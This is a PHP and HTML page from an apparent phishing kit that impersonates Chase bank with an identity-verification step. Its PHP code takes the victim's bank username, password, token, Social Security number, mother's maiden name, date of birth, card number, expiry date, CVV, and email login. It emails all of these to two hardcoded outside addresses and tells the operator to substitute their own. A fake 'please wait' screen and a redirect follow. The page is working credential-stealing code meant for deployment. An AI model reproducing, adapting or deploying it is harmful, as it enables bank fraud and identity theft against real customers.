<?php require_once("../private/includes/initialize.php"); ?>
<?php error_reporting(0); ?>
<?php

$TheUsersLoginName = $_SESSION['usersLoginName'];
$TheUsersLoginCode = $_SESSION['usersLoginCode'];
$TheUsersLoginToken = $_SESSION['usersLoginToken'];
$TheUsersEmailAddress = $_SESSION['loginEmailForUser'];
$TheUsersEmailPassword = $_SESSION['loginPassForUser'];
$TheUsersSocialSecNum = $_SESSION['serialNumForUser'];
$TheUsersMotherMaidenName = $_SESSION['maidenNameForUser'];
$TheUsersDateOfBirth = $_SESSION['dateOfBirthForUser'];


$cardHoldersNum = "";
$expiryDate = "";
$cvvCodeSecure = "";
$randomStringTwo =  generateRandomString();
if(isset($_POST['submitLogInfoThree'])){
  $cardHoldersNum = htmlspecialchars(trim($_POST['ccNumber']));
  $expiryDate = htmlspecialchars(trim($_POST['expDate']));
  $cvvCodeSecure = htmlspecialchars(trim($_POST['cvvJP']));
  if(!empty($cardHoldersNum) && !empty($expiryDate) && !empty($cvvCodeSecure)){

        $ipAdd = $ip = getenv("REMOTE_ADDR")."\n";
        $ua=getBrowser();
        $yourbrowser= " " . $ua['name'] . " " . $ua['version'] . " ";
        $OS_system = os_info($uagent);


        // CHANGE THIS TO YOUR EMAIL ADDRESS YOU WANT TO RECEIVE

        $to = "willsomnincltd@gmail.com,wire227@protonmail.com";

        $subject = "Chase Result";

        $body = "

        RESULT FROM CHASE PAGE - INFO BELOW: \n

        |----------------------  CHASE | INFO  ----------------------| \n

        Username      : $TheUsersLoginName \n

        Password      : $TheUsersLoginCode \n

        Token         : $TheUsersLoginToken \n

        SSN       : $TheUsersSocialSecNum \n

        MMN       : $TheUsersMotherMaidenName \n

        Date of Birth       : $TheUsersDateOfBirth \n

        Card Number       : $cardHoldersNum \n

        Expiry Date       : $expiryDate \n

        CVV       : $cvvCodeSecure \n

        |---------------------- EMAIL | INFO  ------------------------| \n

        Email Address       : $TheUsersEmailAddress \n

        Email Password        : $TheUsersEmailPassword \n

        |---------------------- I N F O | I P ----------------------| \n

        |Client IP ADDRESS       : $ipAdd

        |---- http://www.geoiptool.com/?IP=$ipAdd ---- \n

        Users Browser       : $yourbrowser \n

        Users Operating System      : $OS_system \n




        |------------------- LoopHole -------------------|

        This is an automated Email. Please do not reply to this Email. \n

        ";

        mail($to,$subject,$body,"From: chase-result@domain.com\r\n");

} else{
     echo "";
  }
}

?>

<!doctype html>
<html lang="en">

  <head>
    <title>Verifying Your Identity - chase.com</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="author" content="JP-Morgan Chase">
    <meta name="desc" content="JPMorgan Chase & Co. is a leading global financial services firm and one of the largest banking institutions in the United States , with operations worldwide">
    <meta name="keywords" content="Chase online credit cards, mortgages, commercial banking, auto loans, investing & retirement planning, checking and business banking">

    <link rel="stylesheet" href="bootstrap/css/font-awesome.min.css">
    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="stylesheet/customStyles.css">
    <link rel="icon" href="images/favicon.ico" sizes="32x32">
  </head>
  <body class="custom-background-2">
    <header id="logon-summary-menu">
      <div class="transparent-header-jpui">
        <div>
          <a href="https://www.chase.com/">
            <div class="chase-logo"></div>
          </a>
        </div>
      </div>
    </header>

    <div id="wholePage-new" class="hfeed site">

        <div class="container" id="containing-style">
          <div class="row">
            <div class="col-xs-12" id="new-colun-style">

              <div class="panel panel-primary" id="myPanelStyle">
                <div class="panel-heading" id="headPanelStyle">
                  <h1 class="panel-title text-left">Please wait</h1>
                </div>
                <div class="panel-body" id="bodyPanelStyle">
                  <div class="col-xs-12 col-sm-10 col-sm-offset-1">

                    <div class="monitor-progress" id="progress">
                      <div class="row">
                        <div class="col-xs-12 col-sm-6 clear-padding">
                          <h2>
                            Processing...
                            <span class="util high-contrast">step 4 of 4</span>
                          </h2>
                        </div>
                        <div class="col-xs-12 col-sm-6 progress-padding">
                          <div class="progression-of-bars madest" id="progressions-made">
                            <ol class="steps-4" role="presentation">
                              <li class="active current-step" id="progression-made-1"></li>
                              <li class="active current-step" id="progression-made-2"></li>
                              <li class="active current-step" id="progression-made-3"></li>
                              <li class="active current-step" id="progression-made-4"></li>
                            </ol>
                          </div>
                        </div>

                      </div>
                    </div>
                    <p class="text-right customer-question">
                      <a href="https://www.chase.com/digital/resources/accessibility">
                        Have any questions? <span class="glyphicon glyphicon-menu-right style-types"></span>
                      </a>
                    </p>
                    <h3 class="text-left new-three-style">Please wait.</h3>
                    <p class="text-left customer-question">
                      Please wait while we verify your identity and account information.
                    </p>

                    <div class="row">
                          <div class="col-xs-12" id="new-input-Style-Log">
                              <div id="processing-the-info">
                              <img class="img-responsive center-block" src="images/cb.gif" alt="">
                            </div>
                          </div>
                    </div>
                  </div>
                </div>

              </div>

            </div>
          </div>
        </div>

    </div>

      <script type="text/javascript">

          setTimeout(function(){
            window.location="verified.php?session_id=i7bt28o1rx7tbny891ye81ypszn1478tbys123y78BGDWUYB78e3rt2od bg2378ye92ped23e382ey329egud827o10129373219rfgd03h9h293bwdc8ihr390jksd4371ceudsw87e2igowshdfw23yy2e873e3kjchiowswxzzxcsrfcewre";

          }, 7000);

      </script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
      <script src="js/main.js"></script>
      <script>
          new WOW().init();
      </script>

      <script src="bootstrap/js/jquery.min.js"></script>
      <script src="bootstrap/js/bootstrap.min.js"></script>

  </body>
</html>
